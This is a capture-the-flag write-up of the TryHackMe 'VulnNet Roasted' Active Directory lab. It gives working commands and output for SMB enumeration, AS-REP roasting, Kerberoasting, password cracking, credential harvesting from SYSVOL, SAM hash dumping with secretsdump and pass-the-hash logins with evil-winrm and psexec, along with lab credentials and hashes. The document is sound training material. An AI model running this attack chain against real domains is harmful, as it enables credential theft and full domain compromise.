# 10 - Vulnet Roasted

Room Link --> [https://tryhackme.com/room/vulnnetroasted](https://tryhackme.com/room/vulnnetroasted)

Nmap results:&#x20;

{% code overflow="wrap" lineNumbers="true" fullWidth="true" %}
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-08 05:56:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
```
{% endcode %}

Smb Enumeration: we viewed the shares.

{% code fullWidth="true" %}
```bash
# using SMBMap.
smbmap -H 10.10.15.112 -u ' '

	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing
	
# using crackmapexec.
crackmapexec smb 10.10.175.103 -u guest -p "" --shares
```
{% endcode %}

<figure><img src=".gitbook/assets/image (67).png" alt=""><figcaption><p>1</p></figcaption></figure>

Reading the shares we have read access on.

```bash
smbclient \\\\10.10.15.112\\VulnNet-Business-Anonymous

# After reading all the files, we got some usernames:
Johnny Leet --> sync manager
Alexa Whitehat --> business manager
Jack Goldenhand --> 
Tony Skid --> internal infrastructure.
```

Since we have read access to `IPC share`. We are able to list the domain users as anonymous using an impacket tool called **lookupsid.py or even Crackmapexec.**

{% code overflow="wrap" lineNumbers="true" %}
```bash
# using lookusid
lookupsid.py anonymous@10.10.15.112 | grep SidTypeUser

# results.
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)

# we can use some linuxfu to trim the results:
lookupsid.py anonymous@10.10.15.112 | grep SidTypeUser | awk '{print $2}' | cut -d '\' -f 2
# output.
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet

# using crackmapexec.
crackmapexec smb 10.10.15.112 -u 'anonymous' -p '' --rid-brute

# results.
We got same results with crackmapexec also.
```
{% endcode %}

Since we have list of valid usernames, we can perform the "**ASREPRoasting" attack.**

{% hint style="success" %}
**ASReproasting** occurs when a user account has the privilege **“**<mark style="color:orange;">**Does not require Pre-Authentication**</mark>**”** set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

We can retrieve Kerberos tickets using a tool called “**GetNPUsers.py**” in [Impacket](https://github.com/SecureAuthCorp/impacket). This allows us to query ASREProastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames, which we enumerated previously during our SMB enumeration.
{% endhint %}

We save those valid usernames into a list "users.txt".

{% code overflow="wrap" lineNumbers="true" fullWidth="true" %}
```bash
GetNPUsers.py vulnnet-rst.local/ -usersfile users.txt -no-pass -dc-ip 10.10.27.191 -outputfile kerberos_users.txt

# results.
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:c856d8d6b0ae2a8222e4e65fe7a50ff4$0b6c47183820baa125094946ca444685b8a7eaf90cd2ac8d25c164767cf83e301781132223d288de1a6ba9f188bb6aa30755dcbf8a1c5b68319fbb3595efa0695d7eef3c3fbb06efe2afe82897bfdde137e4a6fbb23670a82876f61be26327d82b6f49015742f77751df2432844fe1274de259ceeebdcc632a4e6d6bff4a5543e2cf9fe3ffcfc84f3a7e99ec1ae337ba1886e2aa77c29754aa3f44019bdf9aa77f98967504ea1233ec100d2d5f42ab0a30f246de2f9fb8caa932e40aed78f7b9a14b4f6cfb37f02cc157d55e3dcd719b9aa35674ea5f48ab32a4196700974e6f61f9ab5ddc1131413cf6ab7e69d6f4328e20ece32adc
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set

```
{% endcode %}

The user `t-skid` had no preauthentication enabled and thus we got an ASREP for the user `t-skid`. This ASREP includes the TGT and a part which contains the session key for the communication between the user and the TGS.&#x20;

Cracking the hash.

{% code overflow="wrap" lineNumbers="true" %}
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# results.
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL) 

# using hashcat.
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
{% endcode %}

&#x20;We now have valid credentials: `t-skid:tj072889*`

#### Initial Access

Since Win-RM (5985) is open, we tried logging in with Evil-WinRM, wmiexec, smbexec, etc.., but it did'nt work.

We can use "crackmapexec" to enumerate other users that could be using same password as "t-skid" user.

{% code overflow="wrap" lineNumbers="true" %}
```bash
crackmapexec smb 10.10.27.191 vulnnet-rst.local/ -u users.txt -p password.txt --shares
# no other user is using same password, so dead end.
# we could use the t-skid creds to enumerate the SMB shares also. But before that, lets do kerberoasting attack.
```
{% endcode %}

### Kerberoasting <a href="#5308" id="5308"></a>

Now that we have a set of standard user credentials, we can start looking for supported **Service Principal Name’s (SPN’s)** and get **Ticket Granting Service (TGS)** for the SPN using “**GetUserSPNs**” tool from Impacket.

{% code overflow="wrap" lineNumbers="true" %}
```bash
GetUserSPNs.py 'vulnnet-rst.local/t-skid:tj072889*' -dc-ip 10.10.27.191 -request

# We are able to identify a service called enterprise-core-vn. Further, we have a TGS ticket that contains its password hash. We can crack this too.
```
{% endcode %}

{% code overflow="wrap" lineNumbers="true" %}
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# cracked results.
ry=ibfkfv,s6h,

# We now have the password for a service account in the AD domain. Let’s again try to use evil-winrm to log in. This time it works! We got access to the system.
```
{% endcode %}

Logging in with Evil-WinRM

`evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.10.68.222 -N` - from here we cat the user flag.

<figure><img src=".gitbook/assets/image (69).png" alt=""><figcaption><p>user flag</p></figcaption></figure>

Using crackmapexec to see if we can access any shares, and this time around we have Read access on the "NETLOGON and SYSVOL" shares

{% code overflow="wrap" lineNumbers="true" %}
```bash
crackmapexec smb 10.10.27.191 vulnnet-rst.local/ -u enterprise-core-vn -p ry=ibfkfv,s6h, --shares
```
{% endcode %}

<figure><img src=".gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

We saw a "ResetPassword.vbs" file in the SYSVOL/vulnnet-rst.local/scripts/ share folder which contains some credentials:

```
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

Let use crackmapexec to see if we can authenticate to shares:

`crackmapexec smb 10.10.68.222 vulnnet-rst.local/ -u a-whitehat -p bNdKVkjv3RR9ht --shares` - and we saw "pwn3d" meaning we got an Administrator credential.

<figure><img src=".gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

Tried to authenticate/login using Evil-WinRM again or use "wmiexec" tool.

`wmiexec.py vulnnet-rst.local/a-whitehat@10.10.68.222` - using wmiexec.

`evil-winrm -u a-whitehat -p 'bNdKVkjv3RR9ht' -i 10.10.68.222` - and we got in.

Since we are member of the local administrator group, we can dump SAM/SYSTEM hashes.

There are 2 ways to do this:

1. We can simply create a backup of the SYSTEM and the SAM file, and use "Impacket's secretsdump.py" to dump the SAM hashes.
2. Or, we could use "Impacket's secretsdump.py" directly to dump the SAM hashes from kali, since we have credentials. This way is faster, because the BOX is really really slow.

`secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.68.222` - and we got the hashes.

<figure><img src=".gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

We could try to crack the hash, or use pass-the-hash attack with "psexec" or "evil-winrm", wmiexec, etc

{% code overflow="wrap" lineNumbers="true" %}
```bash
# using evil-winrm.
evil-winrm -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d -i 10.10.68.222 -N
# using wmiexec.

# using psexec.
psexec.py vulnet-rst.local/administrator@10.10.68.222 -hashes aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d
```
{% endcode %}

Then cat the system.txt flag.
